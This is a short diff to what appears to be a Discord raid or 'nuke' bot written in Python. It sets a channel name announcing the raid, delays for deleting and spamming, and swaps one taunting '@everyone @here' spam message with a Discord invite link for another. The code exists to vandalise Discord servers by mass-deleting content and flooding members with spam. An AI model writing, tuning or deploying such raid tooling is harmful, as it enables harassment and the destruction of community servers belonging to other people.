@@ -12,7 +12,7 @@ CHANNEL_NAME = "raided by vuzxk LOL"
 DELETE_DELAY = 0.1
 SPAM_DELAY = 0.3
 
-SPAM_MESSAGE = "@everyone Fuck this lame ass server They GOT NUKED BY US LOLLL https://discord.gg/7xCHVchqTs"
+SPAM_MESSAGE = "@everyone @here got nuked by ZZVN btw https://discord.gg/Pf2p4huZxP"
 
 intents = discord.Intents.default()
 intents.message_content = True
